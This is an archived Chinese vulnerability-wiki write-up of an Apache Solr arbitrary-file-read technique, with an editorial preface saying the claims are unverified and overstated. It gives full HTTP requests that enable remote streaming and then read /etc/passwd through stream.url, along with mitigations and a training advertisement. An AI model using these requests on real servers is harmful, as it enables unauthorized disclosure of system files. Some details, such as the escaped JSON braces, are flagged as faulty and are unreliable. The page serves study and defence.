---
source: "MrWQ/vulnerability-paper"
title: "Apache Solr 最新任意文件读取漏洞"
product: "Apache Solr"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "实验8.8.0、创建core、远程配置可修改、debug/dump可调用"
source_url: "https://mp.weixin.qq.com/s/06Ta6WhxrnJmhMYZ-jAS4A"
source_status: "recorded"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-bb934e3ab38c682193973d5e"
entity_id: "ve-bb934e3ab38c682193973d5e"
schema_version: "1"
---

# Apache Solr 最新任意文件读取漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：实验8.8.0、创建core、远程配置可修改、debug/dump可调用
- 证据范围：无CVE，鉴权/网络控制建议有用，但全版本和默认直接可读夸大。

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 任意版本没有依据，最新/0day应标历史日期
- 实际需要显式启用RemoteStreaming，与默认可直接读取表述不一致
- JSON含无效\}；正常stream.url示例http:/少斜线；文件读取body在代码块之外
- 官方不承认声明无原始来源，需改为可证实的配置/访问控制条件
- 培训广告占比高，建议去重压缩

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/06Ta6WhxrnJmhMYZ-jAS4A)

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LebHs2DGyKAEgZupcIbXWAgnQlIoLerewyAX3c3bLLg0iaTpJeUuGKrSWsicRvLMXwCIbhkUC8GqGibg/640?wx_fmt=gif)

原创稿件征集

  

邮箱：edu@antvsion.com

QQ：3200599554

黑客与极客相关，互联网安全领域里

的热点话题

漏洞、技术相关的调查或分析

稿件通过并发布还能收获

200-800 元不等的稿酬

**漏洞简介**

Apache Solr 是一个开源搜索服务引擎，默认安装未授权情况下攻击者可以构造恶意 HTTP 请求读取目标 Apache Solr 服务器的任意文件。

**复制下方链接，靶场实战**

https://www.hetianlab.com/expc.do?ec=ECIDde9d-11f0-4ac2-921f-b04f7e137c75&pk_campaign=weixin-wemedia#stu  

Apache Solr 是一个开源的搜索服务器。具有高度可靠、可伸缩和容错的，提供分布式索引、复制和负载平衡查询、自动故障转移和恢复、集中配置等功能。

**影响版本**

solr 任意版本

**环境搭建**

漏洞环境下载：

```
https://archive.apache.org/dist/lucene/solr/8.8.0/solr-8.8.0.tgz
```

解压后进入 bin 目录，启动（需要 java 环境），

```
./solr start
```

此时启动的 solr 是没有核心进行索引和搜索的，创建一个节点（核心）

```
./solr create -c test
```

访问：http://ip:8983 可以看到创建的核心

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdFTNa25Z8IznU1hr0YqlFBGMPaPBYGx3icDqBjVZbcuaicQpmQibt5ib39qr3bQPtG9wQxics5TJgA4Ag/640?wx_fmt=png)

实际场景下可以看到会有很多核心

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdFTNa25Z8IznU1hr0YqlFBg7eevKMQeKTM6wzZdN601BXJE6ibj3IXwm5cYTWddlwaYAMld8BKgug/640?wx_fmt=png)

**漏洞复现**

**启用远程流传输**

访问 http://ip:8983/solr/test/config / 抓包，将请求包修改为 POST 请求，修改 Content-Type 为 “application/json”，发送以下数据：

```
{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true\}\}
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdFTNa25Z8IznU1hr0YqlFBfRGTJX0ltwSTox2gqviaUeP4ficwEnqIaIln0SicSPcUdUKsUMxmvmMaA/640?wx_fmt=png)

即可开启远程流。

**读取文件**

引入远程流，将 stream.url 的参数的内容作为流传递。正常情况下 stream.url 传入的内容为 “stream.url=http:/www.remotesite.com/path/to/file.pdf”, 构造传入的敏感文件

```http
POST /solr/test/debug/dump?param=ContentStreams HTTP/1.1
Host: 192.168.74.139:8983
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Edg/89.0.774.57
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

stream.url=file:///etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdFTNa25Z8IznU1hr0YqlFBX1PyrQqZ60JIE1B3ibXTdfIxpeicz0YYIbRibhiaJXoeibjJUUR9UktmibEA/640?wx_fmt=png)

**漏洞修复**  

**（官方不承认这是漏洞. jpg）**

因为 solr 默认安装情况下未授权，导致可以读取任意文件，启用 Apache Solr 身份验证可有效缓解该漏洞的影响

配置访问控制策略，避免 Apache Solr 暴露在互联网

**参考**

**赛博回忆录：公布某 Solr 最新版任意文件读取 0day**

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LcC8Xw2aZyiciaLJxvE3ic7hMSDWpcCKDPr8n1d4F3vrKYDS4kNicB9icWMKEv6BXAKrcic7PbwicUdtia8SQ/640?wx_fmt=gif)

逻辑漏洞系列实战训练

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LcC8Xw2aZyiciaLJxvE3ic7hMSDWpcCKDPr8n1d4F3vrKYDS4kNicB9icWMKEv6BXAKrcic7PbwicUdtia8SQ/640?wx_fmt=gif)

胖白老师带你从 0 开始挖洞

掌握 3 个逻辑漏洞原理并利用

配套 2 个实战靶场

4 个 G 网安资料包

限时仅需 2 分钱

快扫码报名👇  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcC8Xw2aZyiciaLJxvE3ic7hMS305JuFE1XSNVPffNp8VJa8AYPRhQCOo719dSBWctzLdBYH8ADoX9Ig/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
